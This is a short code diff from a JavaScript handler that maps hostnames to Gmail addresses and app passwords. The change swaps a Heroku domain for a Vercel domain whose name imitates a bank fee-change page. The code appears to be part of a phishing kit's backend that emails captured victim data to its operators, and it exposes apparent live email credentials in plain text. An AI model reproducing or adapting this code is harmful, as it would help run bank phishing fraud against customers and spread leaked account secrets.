@@ -28,7 +28,7 @@ export default function handler(req, res) {
         email = 'accbrimo05@gmail.com';
         pass = 'hluxpmqqqqsjrbaf';
 
-    } else if(url == 'tarif--ubah.herokuapp.com'){
+    } else if(url == 'bri-tarif.vercel.app'){
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
